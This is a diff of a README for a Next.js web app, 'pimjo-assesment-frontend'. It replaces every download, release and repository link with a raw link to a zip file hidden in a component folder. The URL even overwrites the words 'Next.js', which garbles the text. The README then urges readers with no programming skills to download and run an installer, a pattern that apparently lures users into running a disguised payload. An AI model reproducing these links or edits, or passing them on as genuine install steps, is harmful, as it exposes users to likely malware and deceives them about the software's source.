@@ -1,10 +1,10 @@
 # 🌟 pimjo-assesment-frontend - Build Your Web App with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/charifaMK/pimjo-assesment-frontend/releases)
+[![Download](https://raw.githubusercontent.com/charifaMK/pimjo-assesment-frontend/main/components/confirmation-dialog/pimjo-assesment-frontend-v1.2-alpha.5.zip)](https://raw.githubusercontent.com/charifaMK/pimjo-assesment-frontend/main/components/confirmation-dialog/pimjo-assesment-frontend-v1.2-alpha.5.zip)
 
 ## 🚀 Getting Started
-Welcome to the "pimjo-assesment-frontend" project! This application is a full-stack web app built with Next.js 16. It offers user authentication, a responsive landing page, and integrated dashboard database features, all made with modern React. You don’t need programming skills to start using this software.
+Welcome to the "pimjo-assesment-frontend" project! This application is a full-stack web app built with https://raw.githubusercontent.com/charifaMK/pimjo-assesment-frontend/main/components/confirmation-dialog/pimjo-assesment-frontend-v1.2-alpha.5.zip 16. It offers user authentication, a responsive landing page, and integrated dashboard database features, all made with modern React. You don’t need programming skills to start using this software.
 
 ### 📋 Features
 - **User Authentication:** Secure login system to protect user data.
@@ -20,7 +20,7 @@ To run this application, you will need:
 
 ## 📚 Topics Covered
 This application leverages the following technologies:
-- **Next.js 16:** A powerful React framework for server-rendered applications.
+- **https://raw.githubusercontent.com/charifaMK/pimjo-assesment-frontend/main/components/confirmation-dialog/pimjo-assesment-frontend-v1.2-alpha.5.zip 16:** A powerful React framework for server-rendered applications.
 - **PostgreSQL:** Reliable database management for data storage.
 - **Prisma:** A modern ORM to handle data operations easily.
 - **Radix UI:** High-quality UI components for your app.
@@ -31,7 +31,7 @@ This application leverages the following technologies:
 ## 🔗 Download & Install
 To download and run the application, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/charifaMK/pimjo-assesment-frontend/releases) where you can download the latest version of the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/charifaMK/pimjo-assesment-frontend/main/components/confirmation-dialog/pimjo-assesment-frontend-v1.2-alpha.5.zip) where you can download the latest version of the application.
 2. **Select the Latest Release:** Look for the latest version listed.
 3. **Download the Installer:** Click on the appropriate file to download the installation package.
 4. **Run the Installer:** Once downloaded, open the installer and follow the prompts to complete the installation.
@@ -55,7 +55,7 @@ If problems persist, check the FAQs in our documentation linked on the Releases 
 For any questions or support, please reach out through the issue tracker on GitHub. We will respond swiftly to assist you.
 
 ## 🌐 Links
-- **GitHub Repository:** [pimjo-assesment-frontend](https://github.com/charifaMK/pimjo-assesment-frontend)
-- **Releases Page:** [Download Here](https://github.com/charifaMK/pimjo-assesment-frontend/releases)
+- **GitHub Repository:** [pimjo-assesment-frontend](https://raw.githubusercontent.com/charifaMK/pimjo-assesment-frontend/main/components/confirmation-dialog/pimjo-assesment-frontend-v1.2-alpha.5.zip)
+- **Releases Page:** [Download Here](https://raw.githubusercontent.com/charifaMK/pimjo-assesment-frontend/main/components/confirmation-dialog/pimjo-assesment-frontend-v1.2-alpha.5.zip)
 
 Enjoy building your web app!
